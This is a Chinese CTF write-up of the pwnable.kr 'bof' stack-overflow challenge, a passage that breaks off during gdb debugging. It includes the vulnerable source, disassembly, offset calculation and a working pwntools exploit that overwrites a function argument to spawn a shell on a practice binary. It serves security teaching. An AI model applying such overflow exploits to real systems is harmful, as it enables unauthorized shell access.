-<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><strong>缓冲区溢出</strong><br><strong>buffer_overflow</strong></p>
-<p>引发缓冲区溢出的原因是相关程序设计语言缺乏类型安全功能，出于效率的考虑，部分函数不对数组边界条件和函数指针引用等进行边界检查。</p>
-<p>例如，C标准库中和字符串操作有关的函数，像 <code>strcpy</code>、<code>strcat</code>、<code>sprintf</code>、<code>gets</code>等函数中，数组和指针都没有自动进行边界检查。</p>
-<p>常见的缓冲区溢出漏洞包括：</p>
-<p>栈溢出漏洞，堆溢出漏洞，整数溢出漏洞，SHE结构基础漏洞，单字节溢出漏洞，格式化字符串漏洞，C++虚函数漏洞</p>
-<p>本题就是由 <code>gets</code>引起的<strong>栈溢出</strong>，因为 <code>gets</code>不会校验输入字符串的长度</p>
-<p>以本题的 <code>func</code>函数为例</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在提示 <code>overflow me : </code>之后，输入超过 32 字节的字符串填充满缓冲区，再输入若干字节一直填充到传入的 <code>key</code>的前面地址，之后就可以输入我们想要的 <code>key</code>了</p>
-<p><strong>gdb 调试</strong></p>
-<p><code>gdb</code>调试的简单指令，后面会在实践中说明，此处不再赘述</p>
-<hr>
-<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>根据提示连接到终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bof@pwnable.kr -p2222</span><br></pre></td></tr></table></figure>
-
-<p>密码为 <code>guest</code><br>连接成功后输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
-
-<p>观察到文件目录为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bof bof.c readme</span><br></pre></td></tr></table></figure>
-
-<p>先来看看 <code>readme</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bof binary is running at <span class="string">&quot;nc 0 9000&quot;</span> under bof_pwn privilege. get shell and <span class="built_in">read</span> flag</span><br></pre></td></tr></table></figure>
-
-<p>提示 <code>bof</code>在 9000 端口上运行</p>
-<p>先看看 <code>bof</code>的源码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> bof.c</span><br></pre></td></tr></table></figure>
-
-<p>源码为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分析源码逻辑：<br><code>func</code>函数使用 <code>gets</code>函数读入一个字符串 <code>overflowme</code>，提示要我们覆盖掉 <code>overflowme</code>，把传入的参数 <code>key</code>与 <code>0xcafebabe</code>比较，相等就能 <code>getshell</code></p>
-<p>使用 <code>gdb</code>确认需要覆盖的长度</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./bof</span><br></pre></td></tr></table></figure>
-
-<p>进入 <code>gdb</code>后看看相关函数的汇编代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass main</span><br></pre></td></tr></table></figure>
-
-<p>下面是 main 函数的汇编代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x0000129d &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">0x000012a1 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">0x000012a4 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">0x000012a7 &lt;+10&gt;:    push   ebp</span><br><span class="line">0x000012a8 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">0x000012aa &lt;+13&gt;:    push   ecx</span><br><span class="line">0x000012ab &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">0x000012ae &lt;+17&gt;:    call   0x12d5 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">0x000012b3 &lt;+22&gt;:    add    eax,0x2d4d</span><br><span class="line">0x000012b8 &lt;+27&gt;:    sub    esp,0xc</span><br><span class="line">0x000012bb &lt;+30&gt;:    push   0xdeadbeef</span><br><span class="line">0x000012c0 &lt;+35&gt;:    call   0x11fd &lt;func&gt;</span><br><span class="line">0x000012c5 &lt;+40&gt;:    add    esp,0x10</span><br><span class="line">0x000012c8 &lt;+43&gt;:    mov    eax,0x0</span><br><span class="line">0x000012cd &lt;+48&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x000012d0 &lt;+51&gt;:    leave</span><br><span class="line">0x000012d1 &lt;+52&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">0x000012d4 &lt;+55&gt;:    ret</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass func</span><br></pre></td></tr></table></figure>
-
-<p>下面是 func 函数的汇编代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0x000011fd &lt;+0&gt;:     push   ebp</span><br><span class="line">0x000011fe &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">0x00001200 &lt;+3&gt;:     push   esi</span><br><span class="line">0x00001201 &lt;+4&gt;:     push   ebx</span><br><span class="line">0x00001202 &lt;+5&gt;:     sub    esp,0x30</span><br><span class="line">0x00001205 &lt;+8&gt;:     call   0x1100 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">0x0000120a &lt;+13&gt;:    add    ebx,0x2df6</span><br><span class="line">0x00001210 &lt;+19&gt;:    mov    eax,gs:0x14</span><br><span class="line">0x00001216 &lt;+25&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">0x00001219 &lt;+28&gt;:    xor    eax,eax</span><br><span class="line">0x0000121b &lt;+30&gt;:    sub    esp,0xc</span><br><span class="line">0x0000121e &lt;+33&gt;:    lea    eax,[ebx-0x1ff8]</span><br><span class="line">0x00001224 &lt;+39&gt;:    push   eax</span><br><span class="line">0x00001225 &lt;+40&gt;:    call   0x1050 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">0x0000122a &lt;+45&gt;:    add    esp,0x10</span><br><span class="line">0x0000122d &lt;+48&gt;:    sub    esp,0xc</span><br><span class="line">0x00001230 &lt;+51&gt;:    lea    eax,[ebp-0x2c]                   ;缓冲区起始地址 [ebp-0x2c]</span><br><span class="line">0x00001233 &lt;+54&gt;:    push   eax</span><br><span class="line">0x00001234 &lt;+55&gt;:    call   0x1060 &lt;gets@plt&gt;</span><br><span class="line">0x00001239 &lt;+60&gt;:    add    esp,0x10</span><br><span class="line">0x0000123c &lt;+63&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe   ;传入的 key 的地址 [ebp+0x8]</span><br><span class="line">0x00001243 &lt;+70&gt;:    jne    0x1272 &lt;func+117&gt;</span><br><span class="line">0x00001245 &lt;+72&gt;:    call   0x1080 &lt;getegid@plt&gt;</span><br><span class="line">0x0000124a &lt;+77&gt;:    mov    esi,eax</span><br><span class="line">0x0000124c &lt;+79&gt;:    call   0x1080 &lt;getegid@plt&gt;</span><br><span class="line">0x00001251 &lt;+84&gt;:    sub    esp,0x8</span><br><span class="line">0x00001254 &lt;+87&gt;:    push   esi</span><br><span class="line">0x00001255 &lt;+88&gt;:    push   eax</span><br><span class="line">0x00001256 &lt;+89&gt;:    call   0x10b0 &lt;setregid@plt&gt;</span><br><span class="line">0x0000125b &lt;+94&gt;:    add    esp,0x10</span><br><span class="line">0x0000125e &lt;+97&gt;:    sub    esp,0xc</span><br><span class="line">0x00001261 &lt;+100&gt;:   lea    eax,[ebx-0x1fe9]</span><br><span class="line">0x00001267 &lt;+106&gt;:   push   eax</span><br><span class="line">0x00001268 &lt;+107&gt;:   call   0x10a0 &lt;system@plt&gt;</span><br><span class="line">0x0000126d &lt;+112&gt;:   add    esp,0x10</span><br><span class="line">0x00001270 &lt;+115&gt;:   jmp    0x1284 &lt;func+135&gt;</span><br><span class="line">0x00001272 &lt;+117&gt;:   sub    esp,0xc</span><br><span class="line">0x00001275 &lt;+120&gt;:   lea    eax,[ebx-0x1fe1]</span><br><span class="line">0x0000127b &lt;+126&gt;:   push   eax</span><br><span class="line">0x0000127c &lt;+127&gt;:   call   0x1090 &lt;puts@plt&gt;</span><br><span class="line">0x00001281 &lt;+132&gt;:   add    esp,0x10</span><br><span class="line">0x00001284 &lt;+135&gt;:   nop</span><br><span class="line">0x00001285 &lt;+136&gt;:   mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">0x00001288 &lt;+139&gt;:   sub    eax,DWORD PTR gs:0x14</span><br><span class="line">0x0000128f &lt;+146&gt;:   je     0x1296 &lt;func+153&gt;</span><br><span class="line">0x00001291 &lt;+148&gt;:   call   0x12e0 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">0x00001296 &lt;+153&gt;:   lea    esp,[ebp-0x8]</span><br><span class="line">0x00001299 &lt;+156&gt;:   pop    ebx</span><br><span class="line">0x0000129a &lt;+157&gt;:   pop    esi</span><br><span class="line">0x0000129b &lt;+158&gt;:   pop    ebp</span><br><span class="line">0x0000129c &lt;+159&gt;:   ret</span><br></pre></td></tr></table></figure>
-
-<p><code>gets</code>到的字符串的起始地址为 <code>ebp-0x2c</code>，之后 <code>cmp</code>的 <code>key</code>的起始地址为 <code>ebp+0x8</code>，所以要覆盖的长度为 <code>0x2c + 0x8 = 52</code></p>
-<p>分析完毕,开始写 <code>exp.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;AAAA&quot;</span>*<span class="number">13</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>理论上直接执行&#96;&#96;exp.py <code>就能</code>getshell&#96;</p>
-<p>当然这里尝试之后会发现连接超时，因为 <code>pwnable.kr</code>是一个很老的靶场，2000 端口上应该已经没有运行 <code>bof</code>了，可以用另一种方式判断是否 <code>getshell</code>成功</p>
-<p>先把 <code>bof</code>下载到本地的 <code>~/exp</code>目录（与 <code>exp.py</code>同目录）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P2222 bof@pwnable.kr:bof ~/exp</span><br></pre></td></tr></table></figure>
-
-<p>运行 <code>bof</code>需要 32 位环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install libc6:i386 libstdc++6:i386</span><br></pre></td></tr></table></figure>
-
-<p>之后改一下 <code>exp.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;AAAA&quot;</span>*<span class="number">13</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>然后执行 <code>exp.py</code>，弹出命令提示符，说明 <code>getshell</code>成功</p>
-<p>不过比较遗憾本题的 <code>flag</code>就无法获取并提交了</p>
-<p>另外也可以在 powershell 中使用如下命令来把 <code>bof</code>下载到桌面</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P2222 bof@pwnable.kr:bof &quot;$($env:USERPROFILE)\Desktop\&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用 ida pro 打开可以更轻松地计算需要覆盖的长度</p>
-<p>使用 ida pro 看看 <code>func</code>函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">func</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> egid; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">__gid_t</span> egid_1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-889275714</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    egid = getegid();</span><br><span class="line">    egid_1 = getegid();</span><br><span class="line">    setregid(egid_1, egid);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nah..&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>光标移到 <code>a1</code>看看地址，显示 <code>ebp + 8h</code>，再看看 <code>gets</code>所获取的 <code>s</code>的地址，显示 <code>ebp - 2Ch</code>，同样也能算出来要覆盖的长度为 <code>0x2c + 0x8 = 52</code></p>
-<hr>
-<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>上面是在静态调试下计算地址差，当然也可以用 <code>gdb</code>动态调试查看栈帧内容判断需覆盖的长度</p>
-<p>先进入 <code>gdb</code>模式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./bof</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>gdb</code>模式下依次执行以下指令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">disass main</span><br><span class="line">disass func</span><br></pre></td></tr></table></figure>
-
-<p>两次 <code>disass</code>返回的信息如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x5655629d &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x565562a1 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x565562a4 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x565562a7 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x565562a8 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x565562aa &lt;+13&gt;:    push   ecx</span><br><span class="line">=&gt; 0x565562ab &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x565562ae &lt;+17&gt;:    call   0x565562d5 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x565562b3 &lt;+22&gt;:    add    eax,0x2d4d</span><br><span class="line">   0x565562b8 &lt;+27&gt;:    sub    esp,0xc</span><br><span class="line">   0x565562bb &lt;+30&gt;:    push   0xdeadbeef</span><br><span class="line">   0x565562c0 &lt;+35&gt;:    call   0x565561fd &lt;func&gt;</span><br><span class="line">   0x565562c5 &lt;+40&gt;:    add    esp,0x10</span><br><span class="line">   0x565562c8 &lt;+43&gt;:    mov    eax,0x0</span><br><span class="line">   0x565562cd &lt;+48&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x565562d0 &lt;+51&gt;:    leave</span><br><span class="line">   0x565562d1 &lt;+52&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x565562d4 &lt;+55&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</span><br><span class="line">   0x565561fd &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x565561fe &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x56556200 &lt;+3&gt;:     push   esi</span><br><span class="line">   0x56556201 &lt;+4&gt;:     push   ebx</span><br><span class="line">   0x56556202 &lt;+5&gt;:     sub    esp,0x30</span><br><span class="line">   0x56556205 &lt;+8&gt;:     call   0x56556100 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x5655620a &lt;+13&gt;:    add    ebx,0x2df6</span><br><span class="line">   0x56556210 &lt;+19&gt;:    mov    eax,gs:0x14</span><br><span class="line">   0x56556216 &lt;+25&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x56556219 &lt;+28&gt;:    xor    eax,eax</span><br><span class="line">   0x5655621b &lt;+30&gt;:    sub    esp,0xc</span><br><span class="line">   0x5655621e &lt;+33&gt;:    lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x56556224 &lt;+39&gt;:    push   eax</span><br><span class="line">   0x56556225 &lt;+40&gt;:    call   0x56556050 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x5655622a &lt;+45&gt;:    add    esp,0x10</span><br><span class="line">   0x5655622d &lt;+48&gt;:    sub    esp,0xc</span><br><span class="line">   0x56556230 &lt;+51&gt;:    lea    eax,[ebp-0x2c]</span><br><span class="line">   0x56556233 &lt;+54&gt;:    push   eax</span><br><span class="line">   0x56556234 &lt;+55&gt;:    call   0x56556060 &lt;gets@plt&gt;</span><br><span class="line">   0x56556239 &lt;+60&gt;:    add    esp,0x10</span><br><span class="line">   0x5655623c &lt;+63&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br><span class="line">   0x56556243 &lt;+70&gt;:    jne    0x56556272 &lt;func+117&gt;</span><br><span class="line">   0x56556245 &lt;+72&gt;:    call   0x56556080 &lt;getegid@plt&gt;</span><br><span class="line">   0x5655624a &lt;+77&gt;:    mov    esi,eax</span><br><span class="line">   0x5655624c &lt;+79&gt;:    call   0x56556080 &lt;getegid@plt&gt;</span><br><span class="line">   0x56556251 &lt;+84&gt;:    sub    esp,0x8</span><br><span class="line">   0x56556254 &lt;+87&gt;:    push   esi</span><br><span class="line">   0x56556255 &lt;+88&gt;:    push   eax</span><br><span class="line">   0x56556256 &lt;+89&gt;:    call   0x565560b0 &lt;setregid@plt&gt;</span><br><span class="line">   0x5655625b &lt;+94&gt;:    add    esp,0x10</span><br><span class="line">   0x5655625e &lt;+97&gt;:    sub    esp,0xc</span><br><span class="line">   0x56556261 &lt;+100&gt;:   lea    eax,[ebx-0x1fe9]</span><br><span class="line">   0x56556267 &lt;+106&gt;:   push   eax</span><br><span class="line">   0x56556268 &lt;+107&gt;:   call   0x565560a0 &lt;system@plt&gt;</span><br><span class="line">   0x5655626d &lt;+112&gt;:   add    esp,0x10</span><br><span class="line">   0x56556270 &lt;+115&gt;:   jmp    0x56556284 &lt;func+135&gt;</span><br><span class="line">   0x56556272 &lt;+117&gt;:   sub    esp,0xc</span><br><span class="line">   0x56556275 &lt;+120&gt;:   lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x5655627b &lt;+126&gt;:   push   eax</span><br><span class="line">   0x5655627c &lt;+127&gt;:   call   0x56556090 &lt;puts@plt&gt;</span><br><span class="line">   0x56556281 &lt;+132&gt;:   add    esp,0x10</span><br><span class="line">   0x56556284 &lt;+135&gt;:   nop</span><br><span class="line">   0x56556285 &lt;+136&gt;:   mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x56556288 &lt;+139&gt;:   sub    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x5655628f &lt;+146&gt;:   je     0x56556296 &lt;func+153&gt;</span><br><span class="line">   0x56556291 &lt;+148&gt;:   call   0x565562e0 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">   0x56556296 &lt;+153&gt;:   lea    esp,[ebp-0x8]</span><br><span class="line">   0x56556299 &lt;+156&gt;:   pop    ebx</span><br><span class="line">   0x5655629a &lt;+157&gt;:   pop    esi</span><br><span class="line">   0x5655629b &lt;+158&gt;:   pop    ebp</span><br><span class="line">   0x5655629c &lt;+159&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
-
-<p>然后加断点，我这次调试时 <code>cmp</code>的位置是这样的</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x5655623c &lt;+63&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br></pre></td></tr></table></figure>
-
-<p>因此断点这么加</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x5655623c</span><br></pre></td></tr></table></figure>
-
-<p>加完之先看看栈帧信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i f</span><br></pre></td></tr></table></figure>
-
-<p>显示的信息如下</p>
